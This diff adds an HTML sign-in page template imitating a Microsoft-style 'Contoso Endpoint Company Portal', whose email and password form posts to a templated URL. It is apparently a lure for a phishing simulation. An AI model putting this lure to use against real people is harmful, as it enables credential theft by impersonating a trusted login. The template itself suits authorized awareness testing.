@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Contoso Endpoint Company Portal - Sign in</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family:
+                    "Segoe UI",
+                    -apple-system,
+                    BlinkMacSystemFont,
+                    "Roboto",
+                    "Helvetica Neue",
+                    sans-serif;
+                background: #f5f5f5;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .header {
+                background: #ffffff;
+                padding: 16px 0;
+                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.08);
+            }
+
+            .header-content {
+                max-width: 1200px;
+                margin: 0 auto;
+                padding: 0 20px;
+                display: flex;
+                align-items: center;
+            }
+
+            .ms-logo {
+                width: 150px;
+            }
+
+            .header-title {
+                margin-left: 16px;
+                font-size: 15px;
+                color: #262626;
+                font-weight: 400;
+            }
+
+            .main-content {
+                flex: 1;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 32px 20px;
+            }
+
+            .login-container {
+                background: #ffffff;
+                width: 100%;
+                max-width: 440px;
+                border-radius: 2px;
+                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+                padding: 44px;
+            }
+
+            .Endpoint-branding {
+                text-align: center;
+                margin-bottom: 32px;
+            }
+
+            .Endpoint-logo {
+                width: 48px;
+                height: 48px;
+                margin: 0 auto 16px;
+                display: block;
+            }
+
+            .login-title {
+                font-size: 24px;
+                font-weight: 600;
+                color: #1b1b1b;
+                margin-bottom: 8px;
+            }
+
+            .login-subtitle {
+                font-size: 15px;
+                color: #605e5c;
+                margin-bottom: 4px;
+            }
+
+            .device-notice {
+                font-size: 13px;
+                color: #d13438;
+                margin-top: 8px;
+                padding: 8px 12px;
+                background: #fdf2f2;
+                border: 1px solid #f5c6cb;
+                border-radius: 2px;
+            }
+
+            .form-group {
+                margin-bottom: 16px;
+            }
+
+            .form-label {
+                display: block;
+                font-size: 15px;
+                color: #323130;
+                margin-bottom: 8px;
+                font-weight: 400;
+            }
+
+            .form-input {
+                width: 100%;
+                height: 32px;
+                padding: 8px 12px;
+                font-size: 15px;
+                border: 1px solid #605e5c;
+                background: #ffffff;
+                color: #323130;
+                outline: none;
+                transition: border-color 0.1s ease-in-out;
+            }
+
+            .form-input:focus {
+                border-color: #0078d4;
+                border-width: 2px;
+                padding: 7px 11px;
+            }
+
+            .form-input:hover {
+                border-color: #323130;
+            }
+
+            .signin-button {
+                width: 100%;
+                height: 32px;
+                background: #0078d4;
+                border: 1px solid #0078d4;
+                color: #ffffff;
+                font-size: 15px;
+                font-weight: 400;
+                cursor: pointer;
+                margin-top: 24px;
+                transition: background-color 0.1s ease-in-out;
+            }
+
+            .signin-button:hover {
+                background: #106ebe;
+                border-color: #106ebe;
+            }
+
+            .signin-button:active {
+                background: #005a9e;
+                border-color: #005a9e;
+            }
+
+            .form-options {
+                margin-top: 24px;
+                text-align: center;
+            }
+
+            .form-link {
+                color: #0078d4;
+                text-decoration: none;
+                font-size: 13px;
+            }
+
+            .form-link:hover {
+                text-decoration: underline;
+            }
+
+            .footer {
+                background: #f8f8f8;
+                padding: 16px 20px;
+                text-align: center;
+                font-size: 12px;
+                color: #605e5c;
+                border-top: 1px solid #edebe9;
+            }
+
+            .footer-links {
+                margin-bottom: 8px;
+            }
+
+            .footer-links a {
+                color: #605e5c;
+                text-decoration: none;
+                margin: 0 12px;
+            }
+
+            .footer-links a:hover {
+                text-decoration: underline;
+            }
+
+            @media (max-width: 480px) {
+                .login-container {
+                    padding: 24px;
+                    margin: 0 16px;
+                }
+
+                .header-content {
+                    padding: 0 16px;
+                }
+
+                .header-title {
+                    font-size: 14px;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="header">
+            <div class="header-content">
+                <img
+                    src="{{.BaseURL}}/Contoso/Contoso-logo.png"
+                    alt="Contoso"
+                    class="ms-logo"
+                />
+                <span class="header-title">Endpoint Company Portal</span>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="login-container">
+                <div class="Endpoint-branding">
+                    <div
+                        style="
+                            font-size: 48px;
+                            line-height: 1;
+                            margin: 0 auto 16px;
+                            display: block;
+                            width: 48px;
+                            height: 48px;
+                            text-align: center;
+                        "
+                    >
+                        🛡️
+                    </div>
+                    <h1 class="login-title">Sign in</h1>
+                    <p class="login-subtitle">to continue to Company Portal</p>
+                    <div class="device-notice">
+                        Device enrollment and management access
+                    </div>
+                </div>
+
+                <form method="POST" action="{{.URL}}">
+                    <div class="form-group">
+                        <label class="form-label" for="email"
+                            >Email, phone, or Skype</label
+                        >
+                        <input
+                            class="form-input"
+                            type="email"
+                            id="email"
+                            name="email"
+                            autocomplete="username"
+                            value="{{.Email}}"
+                            required
+                        />
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label" for="password"
+                            >Password</label
+                        >
+                        <input
+                            class="form-input"
+                            type="password"
+                            id="password"
+                            name="password"
+                            autocomplete="current-password"
+                            required
+                        />
+                    </div>
+
+                    <button class="signin-button" type="submit">Sign in</button>
+
+                    <div class="form-options">
+                        <a href="{{.URL}}" class="form-link"
+                            >Can't access your account?</a
+                        >
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="{{.URL}}">Terms of use</a>
+                <a href="{{.URL}}">Privacy & cookies</a>
+                <a href="{{.URL}}">Help</a>
+            </div>
+            <div>© Contoso</div>
+        </div>
+    </body>
+</html>
